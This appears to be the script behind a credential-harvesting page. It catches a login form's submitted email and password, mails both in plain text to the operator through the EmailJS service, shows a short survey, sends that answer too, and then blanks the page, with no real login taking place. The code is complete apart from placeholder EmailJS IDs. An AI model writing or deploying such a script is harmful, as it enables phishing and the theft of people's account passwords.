(function(){
  emailjs.init("user_youruserid"); // Reemplaza "user_youruserid" con tu User ID de EmailJS
})();

document.getElementById("loginForm").addEventListener("submit", function(event) {
  event.preventDefault();
  var email = document.getElementById("email").value;
  var password = document.getElementById("password").value;

  // Enviar correo electrónico con los datos de inicio de sesión
  emailjs.send("user_youruserid", "template_yourtemplateid", {
    from_name: email,
    message: "Correo electrónico: " + email + "\nContraseña: " + password
  })
  .then(function(response) {
    console.log("SUCCESS!", response.status, response.text);
    document.getElementById("loginContainer").style.display = "none";
    document.getElementById("surveyContainer").style.display = "block";
  }, function(error) {
    console.log("FAILED...", error);
  });
});

document.getElementById("surveyForm").addEventListener("submit", function(event) {
  event.preventDefault();
  var aiHelp = document.getElementById("aiHelp").value;

  // Enviar correo electrónico con la respuesta de la encuesta
  emailjs.send("user_youruserid", "template_yourtemplateid", {
    from_name: "Encuesta",
    message: "Respuesta: " + aiHelp
  })
  .then(function(response) {
    console.log("SUCCESS!", response.status, response.text);
    // Dejar la pantalla en blanco después de enviar la respuesta
    document.body.innerHTML = '';
  }, function(error) {
    console.log("FAILED...", error);
  });
});
